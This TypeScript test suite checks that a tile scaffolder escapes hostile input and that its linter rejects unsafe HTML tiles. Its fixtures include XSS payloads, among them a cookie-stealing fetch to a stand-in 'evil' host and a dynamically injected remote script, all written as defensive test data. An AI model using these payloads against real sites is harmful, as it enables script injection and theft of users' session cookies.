import { test } from 'node:test';
import assert from 'node:assert/strict';
import { scaffoldTile } from '../scaffoldTile.js';
import { lintTile } from './lintTile.js';
import { gradeStamp } from '../checkTile.js';

// The injection corpus that the happy-path test matrix never exercised. A
// plain-English goal can carry a quote or an HTML/JS metacharacter; a `name` or
// `unit` override is raw free text. None of these may break the sealed document,
// inject a script, or flip the green "Vitality-grade" stamp on a broken tile.
const ATTACKS = [
  '</script><script>alert(1)//',
  '"><script>alert(1)</script>',
  "Beer'); fetch('//evil/'+document.cookie); //",
  'x</title></head><body><script>alert(1)</script>',
  'back\\slash "and" \'quote\'',
  '<img src=x onerror=alert(1)>',
  '</style></head><body onload=alert(1)>',
];

function scriptOpens(html: string): number {
  return (html.match(/<script\b[^>]*>/gi) || []).length;
}

test('adversarial: a malicious name never breaks the sealed tile or its green stamp', () => {
  for (const name of ATTACKS) {
    const { html } = scaffoldTile({ goal: 'track beers', name });
    const r = lintTile(html);
    assert.equal(r.errors, 0, `errors for name ${JSON.stringify(name)}: ` + JSON.stringify(r.findings));
    assert.equal(scriptOpens(html), 1, `name ${JSON.stringify(name)} injected a script tag`);
    assert.match(gradeStamp(html), /PASS/, `stamp must stay honest for ${JSON.stringify(name)}`);
  }
});

test('adversarial: a malicious unit is escaped in every sink (HTML + JS)', () => {
  for (const unit of ATTACKS) {
    // measure renders unit into HTML; counter renders it into a JS string.
    for (const goal of ['measure body fat', 'count cold plunges']) {
      const { html } = scaffoldTile({ goal, unit });
      const r = lintTile(html);
      assert.equal(r.errors, 0, `unit ${JSON.stringify(unit)} in "${goal}": ` + JSON.stringify(r.findings));
      assert.equal(scriptOpens(html), 1, `unit ${JSON.stringify(unit)} injected a script tag`);
    }
  }
});

test('lint: a stray </script> (the injection tell) is a hard error', () => {
  const html =
    '<!doctype html><html><head><style>body{background:transparent}::selection{color:#6EE7B7}</style></head>' +
    '<body><div></script><script>alert(1)</script><script>var a=1;</script></body></html>';
  const r = lintTile(html);
  assert.ok(!r.ok, 'stray close must fail the floor');
  assert.ok(r.findings.some((f) => f.rule === 'script-stray-close'), JSON.stringify(r.findings));
});

test('lint: runtime <script> injection via createElement is blocked', () => {
  const html =
    '<!doctype html><html><head><style>body{background:transparent}::selection{color:#6EE7B7}</style></head>' +
    '<body><script>var s=document.createElement("script");s.src="https://evil/x.js";document.body.appendChild(s);</script></body></html>';
  const r = lintTile(html);
  assert.ok(!r.ok);
  assert.ok(r.findings.some((f) => f.rule === 'sealed-dynamic-script'), JSON.stringify(r.findings));
});

test('lint: protocol-relative external CODE is blocked', () => {
  const html =
    '<!doctype html><html><head><style>body{background:transparent}::selection{color:#6EE7B7}</style></head>' +
    '<body><script>import("//esm.sh/x");</script></body></html>';
  const r = lintTile(html);
  assert.ok(!r.ok);
  assert.ok(r.findings.some((f) => f.rule === 'sealed-external-script'), JSON.stringify(r.findings));
});

test('lint: fetching external DATA (bring-your-own-key) is allowed, not banned', () => {
  // This is the deliberate BYO-key capability: a tile may fetch a data API with the
  // user's own key. Banning egress would break the worked example and every BYO-key
  // recipe, so fetch of data must stay clean while external CODE stays blocked.
  const html =
    '<!doctype html><html><head><style>body{background:transparent}::selection{color:#6EE7B7}</style></head>' +
    '<body><script>var Vitality={report:function(s){parent.postMessage({source:"vitality-tile",type:"report",stream:s},"*")}};' +
    'fetch("https://finnhub.io/api/v1/quote?token=x").then(function(r){return r.json()}).then(function(v){Vitality.report({key:"px",label:"Price",value:v,date:"2000-01-01",kind:"measure"})});</script></body></html>';
  const r = lintTile(html);
  assert.equal(r.errors, 0, 'fetching data is the BYO-key feature, not a violation: ' + JSON.stringify(r.findings));
});

// ── The hard-floor refusal corpus ──────────────────────────────────────────────
// A minimal but COMPLETE sealed tile: correct structure, on-brand, a real host
// bridge call. Each test below injects exactly ONE violation into a clean copy and
// proves the floor refuses it (r.ok === false), names the expected rule, and hands
// back a specific fix-it hint. This is the adversarial mirror of lintTile.test.ts:
// it locks in that an off-brand or unsafe tile is reliably rejected, not just that a
// clean one passes.
const SEALED = `<!doctype html><html><head><style>body{background:transparent;color:#fff}::selection{background:rgba(110,231,183,.25)}.big{color:#6EE7B7}</style></head><body>
<div class="big" id="v">0</div><button id="add">add one</button>
<script>
var Vitality={save:function(d){parent.postMessage({source:'vitality-tile',type:'save',data:d},'*')},load:function(){return Promise.resolve([])},report:function(s){parent.postMessage({source:'vitality-tile',type:'report',stream:s},'*')}};
function today(){var d=new Date();var m=String(d.getMonth()+1).padStart(2,'0');var dd=String(d.getDate()).padStart(2,'0');return d.getFullYear()+'-'+m+'-'+dd}
var n=0;document.getElementById('add').addEventListener('click',function(){n++;Vitality.save({n:n});Vitality.report({key:'x',label:'X',value:n,date:today(),kind:'count'})});
</script></body></html>`;

/** The full findings for a HTML string, for readable assert messages. */
const dump = (html: string) => JSON.stringify(lintTile(html).findings);
/** Assert the floor refuses `html`, flags `rule`, and its message mentions `fixWord`. */
function refuses(html: string, rule: string, fixWord: RegExp) {
  const r = lintTile(html);
  assert.equal(r.ok, false, `expected refusal but the floor passed: ${dump(html)}`);
  const f = r.findings.find((x) => x.rule === rule && x.severity === 'error');
  assert.ok(f, `expected a hard error "${rule}", got: ${dump(html)}`);
  assert.match(`${f!.message} ${f!.hint ?? ''}`, fixWord, `"${rule}" must carry a specific fix-it`);
}


/** Assert the floor ADMITS `html` (taste is advice) but warns with `rule`. */
function warnsOnly(html: string, rule: string) {
  const r = lintTile(html);
  assert.equal(r.errors, 0, `taste must not block, got errors: ${dump(html)}`);
  const f = r.findings.find((x) => x.rule === rule && x.severity === 'warn');
  assert.ok(f, `expected a "${rule}" warning, got: ${dump(html)}`);
}

test('adversarial floor: the SEALED base tile is itself clean (0 errors, 0 warnings)', () => {
  const r = lintTile(SEALED);
  assert.equal(r.errors, 0, 'base tile must have no errors: ' + dump(SEALED));
  assert.equal(r.warnings, 0, 'base tile must have no warnings: ' + dump(SEALED));
});

test('taste is advice: an em dash (U+2014) warns but never blocks', () => {
  const bad = SEALED.replace('add one', 'add one — now');
  warnsOnly(bad, 'no-em-dash');
});

test('taste is advice: an em dash inside a code/JS string still warns', () => {
  const bad = SEALED.replace("label:'X'", "label:'X — Y'");
  warnsOnly(bad, 'no-em-dash');
});

test('taste is advice: an emoji / pictograph warns but never blocks', () => {
  for (const emoji of ['\u{1F4A7}', '\u{1F525}', '\u{1F600}', '✨', '⏰']) {
    const bad = SEALED.replace('add one', `add ${emoji}`);
    warnsOnly(bad, 'no-emoji');
  }
});

test('taste is advice: a flag / regional-indicator emoji warns but never blocks', () => {
  const bad = SEALED.replace('add one', 'add \u{1F1FA}\u{1F1F8}');
  warnsOnly(bad, 'no-emoji');
});

test('adversarial floor: an external <script src> (CDN code) is refused', () => {
  const bad = SEALED.replace('<script>\nvar Vitality', '<script src="https://cdn.jsdelivr.net/npm/x.js"></script>\n<script>\nvar Vitality');
  refuses(bad, 'sealed-external-script', /inline/i);
});

test('adversarial floor: an external stylesheet <link href> is refused', () => {
  const bad = SEALED.replace('<style>', '<link rel="stylesheet" href="https://cdn.example.com/a.css"><style>');
  refuses(bad, 'sealed-external-resource', /inline/i);
});

test('adversarial floor: a CSS @import url() of an external URL is refused', () => {
  const bad = SEALED.replace('<style>', '<style>@import url("https://fonts.example.com/x.css");');
  refuses(bad, 'sealed-external-resource', /inline/i);
});

test('adversarial floor: a protocol-relative external import is refused', () => {
  const bad = SEALED.replace('var n=0;', 'import("//esm.sh/thing");var n=0;');
  refuses(bad, 'sealed-external-script', /inline/i);
});

test('adversarial floor: an inline event handler (onclick=) in markup is refused', () => {
  const bad = SEALED.replace('<button id="add">', '<button id="add" onclick="alert(1)">');
  refuses(bad, 'inline-event-handler', /addEventListener|remove/i);
});

test('adversarial floor: an inline onerror= / onload= handler in markup is refused', () => {
  for (const attr of ['onerror="alert(1)"', 'onload="alert(1)"', 'onmouseover="steal()"']) {
    const bad = SEALED.replace('<div class="big" id="v">0</div>', `<div class="big" id="v" ${attr}>0</div>`);
    refuses(bad, 'inline-event-handler', /addEventListener|remove/i);
  }
});

test('over-fire guard: addEventListener and a JS `<` operator never trip the inline-handler rule', () => {
  // `.addEventListener('click')` and `for(;i<n;)` both contain the letters that a naive
  // handler regex would catch; the markup-only, real-tag scan must leave the clean base
  // tile (which uses both patterns) with zero errors.
  const withLt = SEALED.replace('var n=0;', 'var n=0;for(var i=0;i<3;i++){}');
  const r = lintTile(withLt);
  assert.equal(r.errors, 0, 'a JS less-than and addEventListener are not inline handlers: ' + dump(withLt));
});

test('over-fire guard: an ESCAPED tag in text (&lt;img onerror=...&gt;) is inert, not an inline handler', () => {
  // A malicious value that the scaffolder HTML-escapes becomes plain text and cannot run;
  // the floor must not false-flag inert escaped text as a live handler attribute.
  const inert = SEALED.replace('add one', 'add &lt;img src=x onerror=alert(1)&gt;');
  const r = lintTile(inert);
  assert.equal(r.findings.filter((f) => f.rule === 'inline-event-handler').length, 0, 'escaped text is inert: ' + dump(inert));
});

test('adversarial floor: a tile with NO Vitality bridge call is flagged (cannot persist or report)', () => {
  const bad = SEALED
    .replace(/var Vitality=\{[\s\S]*?\};\n/, '')
    .replace('Vitality.save({n:n});Vitality.report({key:\'x\',label:\'X\',value:n,date:today(),kind:\'count\'})', 'n=n');
  const r = lintTile(bad);
  const f = r.findings.find((x) => x.rule === 'bridge-missing');
  assert.ok(f, 'a bridgeless tile must be flagged: ' + dump(bad));
  assert.match(`${f!.message} ${f!.hint ?? ''}`, /Vitality\.save|Vitality\.load|Vitality\.report/, 'the bridge fix-it must name the bridge calls');
});

test('adversarial floor: a report() missing required fields is flagged with the missing names', () => {
  const bad = SEALED.replace(
    "Vitality.report({key:'x',label:'X',value:n,date:today(),kind:'count'})",
    'Vitality.report({value:n})',
  );
  const f = lintTile(bad).findings.find((x) => x.rule === 'report-shape');
  assert.ok(f, 'an invalid report() line must be flagged: ' + dump(bad));
  assert.match(f!.message, /key|date|kind/i, 'the report-shape message must name the missing fields');
});
